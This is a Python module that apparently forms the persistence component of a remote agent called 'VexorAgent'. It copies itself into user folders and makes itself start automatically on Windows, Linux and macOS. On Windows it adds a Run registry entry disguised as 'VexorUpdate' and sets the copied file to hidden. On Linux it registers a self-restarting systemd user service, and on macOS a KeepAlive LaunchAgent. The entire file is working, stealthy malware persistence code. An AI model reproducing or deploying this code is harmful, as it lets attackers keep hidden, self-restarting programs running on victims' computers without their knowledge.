"""Persistence mechanisms — cross-platform."""

import os
import sys
import platform
import shutil


def install(target_dir: str = None) -> bool:
    system = platform.system()
    if system == "Windows":
        return _install_windows(target_dir)
    elif system == "Linux":
        return _install_linux(target_dir)
    elif system == "Darwin":
        return _install_macos(target_dir)
    return False


def _install_windows(target_dir: str = None) -> bool:
    try:
        import winreg
        appdata = os.getenv("APPDATA")
        dest_dir = target_dir or os.path.join(appdata, "VexorAgent")
        os.makedirs(dest_dir, exist_ok=True)
        dest = os.path.join(dest_dir, "vxagent.pyw")
        shutil.copy2(sys.argv[0], dest)

        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_SET_VALUE,
        )
        winreg.SetValueEx(key, "VexorUpdate", 0, winreg.REG_SZ, dest)
        winreg.CloseKey(key)

        # Hide the file
        ctypes = __import__("ctypes")
        ctypes.windll.kernel32.SetFileAttributesW(dest, 2)
        return True
    except Exception:
        return False


def _install_linux(target_dir: str = None) -> bool:
    try:
        home = os.path.expanduser("~")
        dest_dir = target_dir or os.path.join(home, ".config", "vxagent")
        os.makedirs(dest_dir, exist_ok=True)
        dest = os.path.join(dest_dir, "vxagent")
        shutil.copy2(sys.argv[0], dest)
        os.chmod(dest, 0o755)

        # Systemd user service
        svc_dir = os.path.join(home, ".config", "systemd", "user")
        os.makedirs(svc_dir, exist_ok=True)
        svc = f"""[Unit]
Description=Vexor Agent

[Service]
ExecStart={dest}
Restart=always
RestartSec=30

[Install]
WantedBy=default.target
"""
        svc_path = os.path.join(svc_dir, "vxagent.service")
        with open(svc_path, "w") as f:
            f.write(svc)

        os.system(f"systemctl --user enable vxagent.service 2>/dev/null")
        os.system(f"systemctl --user start vxagent.service 2>/dev/null")
        return True
    except Exception:
        return False


def _install_macos(target_dir: str = None) -> bool:
    try:
        home = os.path.expanduser("~")
        dest_dir = target_dir or os.path.join(home, "Library", "Application Support", "VexorAgent")
        os.makedirs(dest_dir, exist_ok=True)
        dest = os.path.join(dest_dir, "vxagent")
        shutil.copy2(sys.argv[0], dest)
        os.chmod(dest, 0o755)

        # LaunchAgent plist
        plist_dir = os.path.join(home, "Library", "LaunchAgents")
        os.makedirs(plist_dir, exist_ok=True)
        plist = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.vexor.agent</string>
    <key>ProgramArguments</key>
    <array><string>{dest}</string></array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>"""
        plist_path = os.path.join(plist_dir, "com.vexor.agent.plist")
        with open(plist_path, "w") as f:
            f.write(plist)
        os.system(f"launchctl load {plist_path} 2>/dev/null")
        return True
    except Exception:
        return False


def uninstall() -> bool:
    system = platform.system()
    try:
        if system == "Windows":
            import winreg
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0,
                winreg.KEY_SET_VALUE,
            )
            winreg.DeleteValue(key, "VexorUpdate")
            winreg.CloseKey(key)
        elif system == "Linux":
            os.system("systemctl --user stop vxagent.service 2>/dev/null")
            os.system("systemctl --user disable vxagent.service 2>/dev/null")
            home = os.path.expanduser("~")
            svc = os.path.join(home, ".config", "systemd", "user", "vxagent.service")
            if os.path.exists(svc):
                os.remove(svc)
        elif system == "Darwin":
            home = os.path.expanduser("~")
            plist = os.path.join(home, "Library", "LaunchAgents", "com.vexor.agent.plist")
            os.system(f"launchctl unload {plist} 2>/dev/null")
            if os.path.exists(plist):
                os.remove(plist)
        return True
    except Exception:
        return False
